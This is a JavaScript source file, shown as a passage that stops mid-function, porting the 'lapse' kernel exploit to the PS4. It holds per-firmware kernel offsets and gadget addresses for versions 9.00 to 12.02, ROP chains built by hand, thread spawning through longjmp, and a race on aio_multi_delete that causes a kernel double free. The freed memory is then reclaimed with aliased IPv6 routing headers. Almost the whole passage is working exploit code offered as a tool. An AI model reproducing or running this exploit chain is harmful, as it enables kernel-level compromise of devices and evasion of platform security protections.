// lapse_ps4.js - PS4 kernel exploit (lapse) ported from lapse.py/lapse.lua
// Uses primitives from inject.js (syscall, call, malloc, read/write functions)

// Configuration
const MAIN_CORE = 7;  // PS4 can use core 7
const MAIN_RTPRIO = 0x100;
const PRI_REALTIME = 2;

const NUM_WORKERS = 2;
const NUM_GROOMS = 0x200;
const NUM_HANDLES = 0x100;
const NUM_RACES = 200;
const NUM_SDS = 64;
const NUM_SDS_ALT = 48;
const NUM_ALIAS = 100;
const LEAK_LEN = 16;
const NUM_LEAKS = 32;
const NUM_CLOBBERS = 8;

// Syscall numbers (BigInt for direct use in ROP chains)
const SYSCALL = {
    read: 0x3n,
    write: 0x4n,
    open: 0x5n,
    close: 0x6n,
    pipe: 0x2an,
    getpid: 0x14n,
    getuid: 0x18n,
    is_in_sandbox: 0x249n,
    getsockname: 0x20n,
    accept: 0x1en,
    socket: 0x61n,
    connect: 0x62n,
    bind: 0x68n,
    setsockopt: 0x69n,
    listen: 0x6an,
    getsockopt: 0x76n,
    socketpair: 0x87n,

    thr_self: 0x1b0n,
    thr_exit: 0x1afn,
    sched_yield: 0x14bn,
    thr_new: 0x1c7n,
    cpuset_getaffinity: 0x1e7n,
    cpuset_setaffinity: 0x1e8n,
    rtprio_thread: 0x1d2n,

    // Event flags (EVF)
    evf_create: 0x21an,
    evf_delete: 0x21bn,
    evf_set: 0x220n,
    evf_clear: 0x221n,

    thr_suspend_ucontext: 0x278n,
    thr_resume_ucontext: 0x279n,

    aio_multi_delete: 0x296n,
    aio_multi_wait: 0x297n,
    aio_multi_poll: 0x298n,
    aio_multi_cancel: 0x29an,
    aio_submit_cmd: 0x29dn,
};

// Constants from sys/socket.h
const AF_UNIX = 1n;
const AF_INET = 2n;
const AF_INET6 = 28n;
const SOCK_STREAM = 1n;
const SOCK_DGRAM = 2n;
const SOL_SOCKET = 0xffffn;
const SO_REUSEADDR = 4n;
const SO_LINGER = 0x80n;

// Constants from netinet/in.h
const IPPROTO_TCP = 6n;
const IPPROTO_UDP = 17n;
const IPPROTO_IPV6 = 41n;

// Constants from netinet/tcp.h
const TCP_INFO = 0x20n;
const size_tcp_info = 0xec;

// Constants from netinet/tcp_fsm.h
const TCPS_ESTABLISHED = 4;

// Constants from netinet6/in6.h
const IPV6_2292PKTOPTIONS = 25n;
const IPV6_PKTINFO = 46n;
const IPV6_NEXTHOP = 48n;
const IPV6_RTHDR = 51n;
const IPV6_TCLASS = 61n;

// AIO constants
const AIO_CMD_READ = 1;
const AIO_CMD_WRITE = 2;
const AIO_CMD_FLAG_MULTI = 0x1000;
const AIO_CMD_MULTI_READ = AIO_CMD_FLAG_MULTI | AIO_CMD_READ;
const AIO_STATE_COMPLETE = 3;
const AIO_STATE_ABORTED = 4;
const MAX_AIO_IDS = 0x80;

const SCE_KERNEL_ERROR_ESRCH = 0x80020003;

// Kernel structure offsets for PS4
const KERNEL_OFFSETS = {
    PROC_FD: 0x48n,
    PROC_PID: 0xb0n,
    FILEDESC_OFILES: 0x0n,
    SIZEOF_OFILES: 0x8n,
    SO_PCB: 0x18n,
    INPCB_PKTOPTS: 0x118n,
};

// Offset of ip6po_tclass in pktopts structure (PS4)
const OFF_TCLASS = 0xb0n;
// Offset of ip6po_rthdr in pktopts structure (PS4)
const OFF_IP6PO_RTHDR = 0x68n;

const PAGE_SIZE = 0x4000;

// PS4 kernel version offsets - indexed by firmware version string
const PS4_KERNEL_OFFSETS = {
    "9.00": {
        EVF_OFFSET: 0x7F6F27n,
        PRISON0: 0x111F870n,
        ROOTVNODE: 0x21EFF20n,
        SYSENT_661_OFFSET: 0x1107F00n,
        JMP_RSI_GADGET: 0x4C7ADn,
    },
    "9.03": {
        EVF_OFFSET: 0x7F4CE7n,
        PRISON0: 0x111B840n,
        ROOTVNODE: 0x21EBF20n,
        SYSENT_661_OFFSET: 0x1103F00n,
        JMP_RSI_GADGET: 0x5325Bn,
    },
    "9.04": {
        EVF_OFFSET: 0x7F4CE7n,
        PRISON0: 0x111B840n,
        ROOTVNODE: 0x21EBF20n,
        SYSENT_661_OFFSET: 0x1103F00n,
        JMP_RSI_GADGET: 0x5325Bn,
    },
    "9.50": {
        EVF_OFFSET: 0x769A88n,
        PRISON0: 0x11137D0n,
        ROOTVNODE: 0x21A6C30n,
        SYSENT_661_OFFSET: 0x1100EE0n,
        JMP_RSI_GADGET: 0x15A6Dn,
    },
    "9.51": {
        EVF_OFFSET: 0x769A88n,
        PRISON0: 0x11137D0n,
        ROOTVNODE: 0x21A6C30n,
        SYSENT_661_OFFSET: 0x1100EE0n,
        JMP_RSI_GADGET: 0x15A6Dn,
    },
    "9.60": {
        EVF_OFFSET: 0x769A88n,
        PRISON0: 0x11137D0n,
        ROOTVNODE: 0x21A6C30n,
        SYSENT_661_OFFSET: 0x1100EE0n,
        JMP_RSI_GADGET: 0x15A6Dn,
    },
    "10.00": {
        EVF_OFFSET: 0x7B5133n,
        PRISON0: 0x111B8B0n,
        ROOTVNODE: 0x1B25BD0n,
        SYSENT_661_OFFSET: 0x110A980n,
        JMP_RSI_GADGET: 0x68B1n,
    },
    "10.01": {
        EVF_OFFSET: 0x7B5133n,
        PRISON0: 0x111B8B0n,
        ROOTVNODE: 0x1B25BD0n,
        SYSENT_661_OFFSET: 0x110A980n,
        JMP_RSI_GADGET: 0x68B1n,
    },
    "10.50": {
        EVF_OFFSET: 0x7A7B14n,
        PRISON0: 0x111B910n,
        ROOTVNODE: 0x1BF81F0n,
        SYSENT_661_OFFSET: 0x110A5B0n,
        JMP_RSI_GADGET: 0x50DEDn,
    },
    "10.70": {
        EVF_OFFSET: 0x7A7B14n,
        PRISON0: 0x111B910n,
        ROOTVNODE: 0x1BF81F0n,
        SYSENT_661_OFFSET: 0x110A5B0n,
        JMP_RSI_GADGET: 0x50DEDn,
    },
    "10.71": {
        EVF_OFFSET: 0x7A7B14n,
        PRISON0: 0x111B910n,
        ROOTVNODE: 0x1BF81F0n,
        SYSENT_661_OFFSET: 0x110A5B0n,
        JMP_RSI_GADGET: 0x50DEDn,
    },
    "11.00": {
        EVF_OFFSET: 0x7FC26Fn,
        PRISON0: 0x111F830n,
        ROOTVNODE: 0x2116640n,
        SYSENT_661_OFFSET: 0x1109350n,
        JMP_RSI_GADGET: 0x71A21n,
    },
    "11.02": {
        EVF_OFFSET: 0x7FC22Fn,
        PRISON0: 0x111F830n,
        ROOTVNODE: 0x2116640n,
        SYSENT_661_OFFSET: 0x1109350n,
        JMP_RSI_GADGET: 0x71A21n,
    },
    "11.50": {
        EVF_OFFSET: 0x784318n,
        PRISON0: 0x111FA18n,
        ROOTVNODE: 0x2136E90n,
        SYSENT_661_OFFSET: 0x110A760n,
        JMP_RSI_GADGET: 0x704D5n,
    },
    "11.52": {
        EVF_OFFSET: 0x784318n,
        PRISON0: 0x111FA18n,
        ROOTVNODE: 0x2136E90n,
        SYSENT_661_OFFSET: 0x110A760n,
        JMP_RSI_GADGET: 0x704D5n,
    },
    "12.00": {
        EVF_OFFSET: 0x784798n,
        PRISON0: 0x111FA18n,
        ROOTVNODE: 0x2136E90n,
        SYSENT_661_OFFSET: 0x110A760n,
        JMP_RSI_GADGET: 0x47B31n,
    },
    "12.02": {
        EVF_OFFSET: 0x784798n,
        PRISON0: 0x111FA18n,
        ROOTVNODE: 0x2136E90n,
        SYSENT_661_OFFSET: 0x110A760n,
        JMP_RSI_GADGET: 0x47B31n,
    },
};

// Will be set after detecting firmware version
let selected_fw_offsets = null;

// Global buffers for signaling
let pipe_buf = null;
let ready_signal = null;
let deletion_signal = null;
let AIO_ERRORS = null;

// longjmp address - set by inject.js from eboot GOT
// longjmp_addr is a global variable set in inject.js

// Initialize global buffers
function init_lapse_globals() {
    pipe_buf = malloc(8);
    ready_signal = malloc(8);
    deletion_signal = malloc(8);
    AIO_ERRORS = malloc(4 * MAX_AIO_IDS);

    // longjmp_addr is set by inject.js from eboot GOT (works across all firmwares)
    if (!longjmp_addr) {
        throw new Error("longjmp_addr not set by inject.js");
    }

    logger.log("lapse globals initialized");
    logger.log("longjmp @ " + hex(longjmp_addr));
}

// Helper: Convert signed 64-bit to check for -1
function is_error(val) {
    // Check for -1 (error return) - handle both BigInt and number
    if (typeof val === 'bigint') {
        return val === 0xffffffffffffffffn || val >= 0xffffffff00000000n;
    }
    return val === -1 || val === 0xffffffff;
}

// Get per-syscall gadget from syscall_gadget_table
// These gadgets have the form: mov eax, <num>; mov r10, rcx; syscall; ret
function get_syscall_gadget(syscall_num) {
    const num = Number(syscall_num);
    const gadget = syscall_gadget_table[num];
    if (!gadget) {
        throw new Error("No gadget for syscall " + num);
    }
    return gadget;
}

// Helper: Wait for memory value to reach threshold
function wait_for(addr, threshold, max_iterations = 10000000) {
    let count = 0;
    while (read64_uncompressed(addr) !== BigInt(threshold)) {
        // Busy wait with occasional yield
        count++;
        if (count > max_iterations) {
            logger.log("wait_for timeout at " + hex(addr) + " after " + count + " iterations");
            logger.log("  current value: " + hex(read64_uncompressed(addr)));
            return false;
        }
    }
    return true;
}

// Reset race state signals
function reset_race_state() {
    write64_uncompressed(ready_signal, 0n);
    write64_uncompressed(deletion_signal, 0n);
}

//
// Threading functions - matches PS5 lapse.js exactly
//

// Global FPU/MXCSR values saved from setjmp
var saved_fpu_ctrl = 0;
var saved_mxcsr = 0;

// Initialize threading by calling setjmp to get FPU/MXCSR values
function init_threading() {
    const jmpbuf = malloc(0x60);

    call(setjmp_addr, jmpbuf);
    saved_fpu_ctrl = Number(read32_uncompressed(jmpbuf + 0x40n));
    saved_mxcsr = Number(read32_uncompressed(jmpbuf + 0x44n));

    logger.log("init_threading: fpu=" + hex(saved_fpu_ctrl) + " mxcsr=" + hex(saved_mxcsr));
    logger.flush();
}

// Spawn a thread with ROP chain - matches PS5 spawn_thread exactly
function spawn_thread(fake_rop_array) {
    const fake_rop_addr = get_backing_store(fake_rop_array);

    const jmpbuf = malloc(0x60);

    // Only write the 4 fields we need - exactly like PS5
    write64_uncompressed(jmpbuf + 0x00n, g.get('ret'));        // ret addr (RIP)
    write64_uncompressed(jmpbuf + 0x10n, fake_rop_addr);       // RSP - pivot to ROP chain
    write32_uncompressed(jmpbuf + 0x40n, BigInt(saved_fpu_ctrl));  // FPU control word
    write32_uncompressed(jmpbuf + 0x44n, BigInt(saved_mxcsr));     // MXCSR

    const stack_size = 0x400n;
    const tls_size = 0x40n;

    const thr_new_args = malloc(0x80);
    const tid_addr = malloc(0x8);
    const cpid = malloc(0x8);
    const stack = malloc(Number(stack_size));
    const tls = malloc(Number(tls_size));

    write64_uncompressed(thr_new_args + 0x00n, longjmp_addr);  // start_func = longjmp
    write64_uncompressed(thr_new_args + 0x08n, jmpbuf);        // arg = jmpbuf
    write64_uncompressed(thr_new_args + 0x10n, stack);         // stack_base
    write64_uncompressed(thr_new_args + 0x18n, stack_size);    // stack_size
    write64_uncompressed(thr_new_args + 0x20n, tls);           // tls_base
    write64_uncompressed(thr_new_args + 0x28n, tls_size);      // tls_size
    write64_uncompressed(thr_new_args + 0x30n, tid_addr);      // child_tid (output)
    write64_uncompressed(thr_new_args + 0x38n, cpid);          // parent_tid (output)

    // Call thr_new using ROP with syscall_wrapper (since thr_new may not have a dedicated gadget)
    write64(add_rop_smash_code_store, 0xab0025n);
    real_rbp = addrof(rop_smash(1)) + 0x700000000n - 1n + 2n;

    let i = 0;
    fake_rop[i++] = g.get('pop_rax');
    fake_rop[i++] = SYSCALL.thr_new;
    fake_rop[i++] = g.get('pop_rdi');
    fake_rop[i++] = thr_new_args;
    fake_rop[i++] = g.get('pop_rsi');
    fake_rop[i++] = 0x68n;
    fake_rop[i++] = syscall_wrapper;

    // Store return value
    fake_rop[i++] = g.get('pop_rdi');
    fake_rop[i++] = base_heap_add + fake_rop_return;
    fake_rop[i++] = g.get('mov_qword_ptr_rdi_rax');

    // Return to JS
    fake_rop[i++] = g.get('pop_rax');
    fake_rop[i++] = 0x2000n;
    fake_rop[i++] = g.get('pop_rsp_pop_rbp');
    fake_rop[i++] = real_rbp;

    write64(add_rop_smash_code_store, 0xab00260325n);
    oob_arr[39] = base_heap_add + fake_frame;
    rop_smash(obj_arr[0]);

    const result = read64(fake_rop_return);
    logger.log("thr_new result: " + hex(result));
    logger.flush();

    if (result !== 0n) {
        throw new Error("thr_new failed: " + hex(result));
    }

    const tid = read64_uncompressed(tid_addr);
    logger.log("worker tid: " + hex(tid));
    logger.flush();
    return tid;
}

//
// CPU affinity and priority functions
//
function pin_to_core(core) {
    const level = 3n;  // CPU_LEVEL_WHICH
    const which = 1n;  // CPU_WHICH_TID
    const id = 0xffffffffffffffffn;  // -1 (current thread)
    const setsize = 0x10n;
    const mask = malloc(0x10);

    write16_uncompressed(mask, 1 << core);

    return syscall(SYSCALL.cpuset_setaffinity, level, which, id, setsize, mask);
}

function set_rtprio(prio) {
    const PRI_REALTIME = 2;
    const RTP_SET = 1;
    const rtprio_buf = malloc(4);

    write16_uncompressed(rtprio_buf, PRI_REALTIME);
    write16_uncompressed(rtprio_buf + 2n, prio);

    syscall(SYSCALL.rtprio_thread, BigInt(RTP_SET), 0n, rtprio_buf);
}

//
// Socket helper functions
//
function new_socket() {
    const sd = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    if (is_error(sd)) {
        throw new Error("new_socket failed");
    }
    return sd;
}

function new_tcp_socket() {
    const sd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
    if (is_error(sd)) {
        throw new Error("new_tcp_socket failed");
    }
    return sd;
}

function ssockopt(sd, level, optname, optval, optlen) {
    const ret = syscall(SYSCALL.setsockopt, BigInt(sd), level, optname, optval, optlen);
    if (is_error(ret)) {
        throw new Error("setsockopt failed");
    }
}

function gsockopt(sd, level, optname, optval, optlen) {
    const size_buf = malloc(8);
    write32_uncompressed(size_buf, optlen);

    const ret = syscall(SYSCALL.getsockopt, BigInt(sd), level, optname, optval, size_buf);
    if (is_error(ret)) {
        throw new Error("getsockopt failed");
    }

    return Number(read32_uncompressed(size_buf));
}

function create_pipe() {
    const fildes = malloc(0x10);
    const ret = syscall(SYSCALL.pipe, fildes);

    if (is_error(ret)) {
        throw new Error("pipe failed");
    }

    const read_fd = read32_uncompressed(fildes);
    const write_fd = read32_uncompressed(fildes + 4n);

    return [read_fd, write_fd];
}

//
// AIO functions
//
function aio_submit_cmd(cmd, reqs, num_reqs, ids) {
    const ret = syscall(SYSCALL.aio_submit_cmd, BigInt(cmd), reqs, BigInt(num_reqs), 3n, ids);
    if (is_error(ret)) {
        throw new Error("aio_submit_cmd failed");
    }
    return ret;
}

function aio_multi_delete(ids, num_ids, states = AIO_ERRORS) {
    const ret = syscall(SYSCALL.aio_multi_delete, ids, BigInt(num_ids), states);
    if (is_error(ret)) {
        throw new Error("aio_multi_delete failed");
    }
    return ret;
}

function aio_multi_poll(ids, num_ids, states = AIO_ERRORS) {
    const ret = syscall(SYSCALL.aio_multi_poll, ids, BigInt(num_ids), states);
    if (is_error(ret)) {
        throw new Error("aio_multi_poll failed");
    }
    return ret;
}

function aio_multi_cancel(ids, num_ids, states = AIO_ERRORS) {
    const ret = syscall(SYSCALL.aio_multi_cancel, ids, BigInt(num_ids), states);
    if (is_error(ret)) {
        throw new Error("aio_multi_cancel failed");
    }
    return ret;
}

function aio_multi_wait(ids, num_ids, states = AIO_ERRORS, mode = 1, timeout = 0) {
    const ret = syscall(SYSCALL.aio_multi_wait, ids, BigInt(num_ids), states, BigInt(mode), BigInt(timeout));
    if (is_error(ret)) {
        throw new Error("aio_multi_wait failed");
    }
    return ret;
}

function make_reqs1(num_reqs) {
    const reqs1 = malloc(0x28 * num_reqs);
    for (let i = 0; i < num_reqs; i++) {
        write32_uncompressed(reqs1 + BigInt(i * 0x28 + 0x20), 0xffffffff);  // fd = -1
    }
    return reqs1;
}

function spray_aio(loops, reqs1, num_reqs, ids, multi = true, cmd = AIO_CMD_READ) {
    const step = 4 * (multi ? num_reqs : 1);
    const full_cmd = cmd | (multi ? AIO_CMD_FLAG_MULTI : 0);

    for (let i = 0; i < loops; i++) {
        aio_submit_cmd(full_cmd, reqs1, num_reqs, ids + BigInt(i * step));
    }
}

function cancel_aios(ids, num_ids) {
    const len = MAX_AIO_IDS;
    const rem = num_ids % len;
    const num_batches = Math.floor((num_ids - rem) / len);

    for (let i = 0; i < num_batches; i++) {
        aio_multi_cancel(ids + BigInt(i * 4 * len), len);
    }

    if (rem > 0) {
        aio_multi_cancel(ids + BigInt(num_batches * 4 * len), rem);
    }
}

function free_aios(ids, num_ids, do_cancel = true) {
    const len = MAX_AIO_IDS;
    const rem = num_ids % len;
    const num_batches = Math.floor((num_ids - rem) / len);

    for (let i = 0; i < num_batches; i++) {
        const addr = ids + BigInt(i * 4 * len);
        if (do_cancel) {
            aio_multi_cancel(addr, len);
        }
        aio_multi_poll(addr, len);
        aio_multi_delete(addr, len);
    }

    if (rem > 0) {
        const addr = ids + BigInt(num_batches * 4 * len);
        if (do_cancel) {
            aio_multi_cancel(addr, rem);
        }
        aio_multi_poll(addr, rem);
        aio_multi_delete(addr, rem);
    }
}

function free_aios2(ids, num_ids) {
    free_aios(ids, num_ids, false);
}

// (prepare_aio_multi_delete_rop removed - now build ROP inline like PS5)

//
// Execute suspend chain via ROP (write + yield + suspend in rapid succession)
// This is critical for winning the race - no JavaScript overhead between syscalls
// Builds a single ROP chain with all three syscalls, triggers once
//
function call_suspend_chain(pipe_write_fd, thr_tid) {
    // Set up for ROP execution (same as call_rop does)
    write64(add_rop_smash_code_store, 0xab0025n);
    real_rbp = addrof(rop_smash(1)) + 0x700000000n - 1n + 2n;

    let i = 0;

    // 1. write(pipe_write_fd, pipe_buf, 1)
    fake_rop[i++] = g.get('pop_rax');
    fake_rop[i++] = SYSCALL.write;
    fake_rop[i++] = g.get('pop_rdi');
    fake_rop[i++] = pipe_write_fd;
    fake_rop[i++] = g.get('pop_rsi');
    fake_rop[i++] = pipe_buf;
    fake_rop[i++] = g.get('pop_rdx');
    fake_rop[i++] = 1n;
    fake_rop[i++] = syscall_wrapper;

    // 2. sched_yield()
    fake_rop[i++] = g.get('pop_rax');
    fake_rop[i++] = SYSCALL.sched_yield;
    fake_rop[i++] = syscall_wrapper;

    // 3. thr_suspend_ucontext(thr_tid)
    fake_rop[i++] = g.get('pop_rax');
    fake_rop[i++] = SYSCALL.thr_suspend_ucontext;
    fake_rop[i++] = g.get('pop_rdi');
    fake_rop[i++] = thr_tid;
    fake_rop[i++] = syscall_wrapper;

    // Store return value (from suspend) to fake_rop_return
    fake_rop[i++] = g.get('pop_rdi');
    fake_rop[i++] = base_heap_add + fake_rop_return;
    fake_rop[i++] = g.get('mov_qword_ptr_rdi_rax');

    // Return to JS
    fake_rop[i++] = g.get('pop_rax');
    fake_rop[i++] = 0x2000n;  // Fake value in RAX to make JS happy
    fake_rop[i++] = g.get('pop_rsp_pop_rbp');
    fake_rop[i++] = real_rbp;

    // Trigger ROP chain
    write64(add_rop_smash_code_store, 0xab00260325n);
    oob_arr[39] = base_heap_add + fake_frame;
    rop_smash(obj_arr[0]);

    return read64(fake_rop_return);
}

//
// Race one attempt - builds ROP chain using BigUint64Array
// Uses per-syscall gadgets (mov eax, <num>; mov r10, rcx; syscall; ret)
//
function race_one(request_addr, tcp_sd, sds) {
    reset_race_state();

    const sce_errs = malloc(8);
    write32_uncompressed(sce_errs, -1n);
    write32_uncompressed(sce_errs + 4n, -1n);

    const [pipe_read_fd, pipe_write_fd] = create_pipe();

    // Build ROP chain using BigUint64Array
    const fake_rop_race1 = new BigUint64Array(200);

    // fake_rop_race1[0] will be overwritten by longjmp, so skip it
    let rop_i = 1;

    const cpu_mask = malloc(0x10);
    write16_uncompressed(cpu_mask, BigInt(1 << MAIN_CORE));

    // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, cpu_mask)
    // Using per-syscall gadgets (mov eax, <num>; mov r10, rcx; syscall; ret)
    fake_rop_race1[rop_i++] = g.get('pop_rdi');
    fake_rop_race1[rop_i++] = 3n;  // CPU_LEVEL_WHICH
    fake_rop_race1[rop_i++] = g.get('pop_rsi');
    fake_rop_race1[rop_i++] = 1n;  // CPU_WHICH_TID
    fake_rop_race1[rop_i++] = g.get('pop_rdx');
    fake_rop_race1[rop_i++] = -1n;  // current thread
    fake_rop_race1[rop_i++] = g.get('pop_rcx');
    fake_rop_race1[rop_i++] = 0x10n;  // setsize
    fake_rop_race1[rop_i++] = g.get('pop_r8');
    fake_rop_race1[rop_i++] = cpu_mask;
    fake_rop_race1[rop_i++] = get_syscall_gadget(SYSCALL.cpuset_setaffinity);

    const rtprio_buf = malloc(4);
    write16_uncompressed(rtprio_buf, PRI_REALTIME);
    write16_uncompressed(rtprio_buf + 2n, BigInt(MAIN_RTPRIO));

    // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
    fake_rop_race1[rop_i++] = g.get('pop_rdi');
    fake_rop_race1[rop_i++] = 1n;  // RTP_SET
    fake_rop_race1[rop_i++] = g.get('pop_rsi');
    fake_rop_race1[rop_i++] = 0n;
    fake_rop_race1[rop_i++] = g.get('pop_rdx');
    fake_rop_race1[rop_i++] = rtprio_buf;
    fake_rop_race1[rop_i++] = get_syscall_gadget(SYSCALL.rtprio_thread);

    // Signal ready - write 1 to ready_signal
    fake_rop_race1[rop_i++] = g.get('pop_rdi');
    fake_rop_race1[rop_i++] = ready_signal;
    fake_rop_race1[rop_i++] = g.get('pop_rax');
    fake_rop_race1[rop_i++] = 1n;
    fake_rop_race1[rop_i++] = g.get('mov_qword_ptr_rdi_rax');

    // Read from pipe (blocks here) - read(pipe_read_fd, pipe_buf, 1)
    fake_rop_race1[rop_i++] = g.get('pop_rdi');
    fake_rop_race1[rop_i++] = pipe_read_fd;
    fake_rop_race1[rop_i++] = g.get('pop_rsi');
    fake_rop_race1[rop_i++] = pipe_buf;
    fake_rop_race1[rop_i++] = g.get('pop_rdx');
    fake_rop_race1[rop_i++] = 1n;
    fake_rop_race1[rop_i++] = get_syscall_gadget(SYSCALL.read);

    // aio multi delete - aio_multi_delete(request_addr, 1, sce_errs + 4)
    fake_rop_race1[rop_i++] = g.get('pop_rdi');
    fake_rop_race1[rop_i++] = request_addr;
    fake_rop_race1[rop_i++] = g.get('pop_rsi');
    fake_rop_race1[rop_i++] = 1n;
    fake_rop_race1[rop_i++] = g.get('pop_rdx');
    fake_rop_race1[rop_i++] = sce_errs + 4n;
    fake_rop_race1[rop_i++] = get_syscall_gadget(SYSCALL.aio_multi_delete);

    // Signal deletion - write 1 to deletion_signal
    fake_rop_race1[rop_i++] = g.get('pop_rdi');
    fake_rop_race1[rop_i++] = deletion_signal;
    fake_rop_race1[rop_i++] = g.get('pop_rax');
    fake_rop_race1[rop_i++] = 1n;
    fake_rop_race1[rop_i++] = g.get('mov_qword_ptr_rdi_rax');

    // Thread exit - thr_exit(0)
    fake_rop_race1[rop_i++] = g.get('pop_rdi');
    fake_rop_race1[rop_i++] = 0n;
    fake_rop_race1[rop_i++] = get_syscall_gadget(SYSCALL.thr_exit);

    // Spawn thread with BigUint64Array
    logger.log("spawning worker thread...");
    logger.flush();
    const thr_tid = spawn_thread(fake_rop_race1);
    logger.log("worker tid: " + hex(thr_tid));
    logger.flush();

    // Wait for worker thread to be ready
    if (!wait_for(ready_signal, 1n, 10000000)) {
        logger.log("timeout waiting for ready_signal");
        syscall(SYSCALL.close, pipe_read_fd);
        syscall(SYSCALL.close, pipe_write_fd);
        return null;
    }
    logger.log("after wait");
    // Execute suspend chain via ROP (write + yield + suspend rapidly)
    const suspend_res = call_suspend_chain(pipe_write_fd, thr_tid);

    // Poll the AIO request
    const poll_err = malloc(4);
    aio_multi_poll(request_addr, 1, poll_err);
    const poll_res = Number(read32_uncompressed(poll_err));
    logger.log("poll: " + hex(poll_res));

    // Get TCP state
    const info_buf = malloc(0x100);
    const info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf, 0x100);

    if (info_size !== size_tcp_info) {
        logger.log("info size mismatch: " + info_size);
    }

    const tcp_state = Number(read8_uncompressed(info_buf));
    logger.log("tcp state: " + hex(tcp_state));

    let won_race = false;

    // Win condition: poll_res != ESRCH and tcp_state != ESTABLISHED
    if (poll_res !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
        // Double free!
        logger.log("RACE WON - triggering double free");
        aio_multi_delete(request_addr, 1, sce_errs);
        won_race = true;
    }

    // Resume worker thread
    const resume_res = syscall(SYSCALL.thr_resume_ucontext, thr_tid);
    logger.log("resume " + hex(thr_tid) + ": " + resume_res);

    // Wait for worker to finish
    wait_for(deletion_signal, 1);
    logger.log("deletion signalled");

    if (won_race) {
        const err_main_thr = Number(read32_uncompressed(sce_errs));
        const err_worker_thr = Number(read32_uncompressed(sce_errs + 4n));
        logger.log("sce_errs: " + hex(err_main_thr) + " " + hex(err_worker_thr));

        if (err_main_thr !== err_worker_thr) {
            throw new Error("bad won - errors don't match");
        }

        // Try to reclaim with aliased rthdrs
        const sd_pair = make_aliased_rthdrs(sds);
        if (sd_pair !== null) {
            syscall(SYSCALL.close, pipe_read_fd);
            syscall(SYSCALL.close, pipe_write_fd);
            return sd_pair;
        } else {
            throw new Error("failed to make aliased rthdrs");
        }
    }

    syscall(SYSCALL.close, pipe_read_fd);
    syscall(SYSCALL.close, pipe_write_fd);
    return null;
}

//
// Build routing header
//
function build_rthdr(buf, size) {
    let len = ((size >> 3) - 1) & ~1;
    size = (len + 1) << 3;

    write8_uncompressed(buf, 0);      // ip6r_nxt
    write8_uncompressed(buf + 1n, len);  // ip6r_len
    write8_uncompressed(buf + 2n, 0);    // ip6r_type
    write8_uncompressed(buf + 3n, len >> 1);  // ip6r_segleft

    return size;
}

function get_rthdr(sd, buf, len) {
    return gsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function set_rthdr(sd, buf, len) {
    ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, BigInt(len));
}

function free_rthdrs(sds) {
    for (const sd of sds) {
        ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0n, 0n);
    }
}

//
// EVF (Event Flag) functions
//
function new_evf(name, flags) {
    const ret = syscall(SYSCALL.evf_create, name, 0n, BigInt(flags));
    if (is_error(ret)) {
        throw new Error("evf_create failed");
    }
    return ret;
}

function set_evf_flags(id, flags) {
    let ret = syscall(SYSCALL.evf_clear, id, 0n);
    if (is_error(ret)) {
        throw new Error("evf_clear failed");
    }
    ret = syscall(SYSCALL.evf_set, id, BigInt(flags));
    if (is_error(ret)) {
        throw new Error("evf_set failed");
    }
}

function free_evf(id) {
    const ret = syscall(SYSCALL.evf_delete, id);
    if (is_error(ret)) {
        throw new Error("evf_delete failed");
    }
}

//
// Verify if memory looks like aio_entry (reqs2) structure
//
function verify_reqs2(addr, cmd) {
    // reqs2.ar2_cmd
    if (Number(read32_uncompressed(addr)) !== cmd) {
        return false;
    }

    // heap_prefixes is an array of randomized prefix bits from heap address candidates
    // if they're truly from heap, they must share a common prefix
    const heap_prefixes = [];

    // check if offsets 0x10 to 0x20 look like kernel heap addresses
    for (let i = 0x10; i <= 0x20; i += 8) {
        if (Number(read16_uncompressed(addr + BigInt(i + 6))) !== 0xffff) {
            return false;
        }
        heap_prefixes.push(Number(read16_uncompressed(addr + BigInt(i + 4))));
    }

    // check reqs2.ar2_result.state
    // state is 32-bit but allocated memory was zeroed, padding must be 0
    const state1 = Number(read32_uncompressed(addr + 0x38n));
    const state2 = Number(read32_uncompressed(addr + 0x3cn));
    if (!(state1 > 0 && state1 <= 4) || state2 !== 0) {
        return false;
    }

    // reqs2.ar2_file must be NULL since we passed bad fd to aio_submit_cmd
    if (read64_uncompressed(addr + 0x40n) !== 0n) {
        return false;
    }

    // check if offsets 0x48 to 0x50 look like kernel addresses
    for (let i = 0x48; i <= 0x50; i += 8) {
        const val = read64_uncompressed(addr + BigInt(i));
        if (Number(read16_uncompressed(addr + BigInt(i + 6))) === 0xffff) {
            // don't push kernel ELF addresses
            if (Number(read16_uncompressed(addr + BigInt(i + 4))) !== 0xffff) {
                heap_prefixes.push(Number(read16_uncompressed(addr + BigInt(i + 4))));
            }
        } else if (i === 0x50 || val !== 0n) {
            // offset 0x48 can be NULL
            return false;
        }
    }

    if (heap_prefixes.length < 2) {
        return false;
    }

    const first_prefix = heap_prefixes[0];
    for (let idx = 1; idx < heap_prefixes.length; idx++) {
        if (heap_prefixes[idx] !== first_prefix) {
            return false;
        }
    }

    return true;
}

//
// Make aliased routing headers (reclaim double-freed memory)
//
function make_aliased_rthdrs(sds) {
    const marker_offset = 4n;
    const size = 0x80;
    const buf = malloc(size);
    const rsize = build_rthdr(buf, size);

    for (let loop = 1; loop <= NUM_ALIAS; loop++) {
        // Set markers
        for (let i = 0; i < NUM_SDS; i++) {
            write32_uncompressed(buf + marker_offset, i + 1);
            set_rthdr(sds[i], buf, rsize);
        }

        // Check for aliasing
        for (let i = 0; i < NUM_SDS; i++) {
            get_rthdr(sds[i], buf, size);
            const marker = Number(read32_uncompressed(buf + marker_offset));

            if (marker !== i + 1) {
                const sd_pair = [sds[i], sds[marker - 1]];
                logger.log("aliased rthdrs at attempt: " + loop + " (pair: " + sd_pair[0] + " " + sd_pair[1] + ")");

                // Remove aliased sockets from list
                sds.splice(marker - 1, 1);
                sds.splice(i, 1);

                // Free remaining rthdrs
                free_rthdrs(sds);

                // Add new sockets
                sds.push(new_socket());
                sds.push(new_socket());

                return sd_pair;
            }
        }
    }

    return null;
}

//
// Make aliased pktopts (reclaim double-freed 0x100 zone memory)
//
function make_aliased_pktopts(sds) {
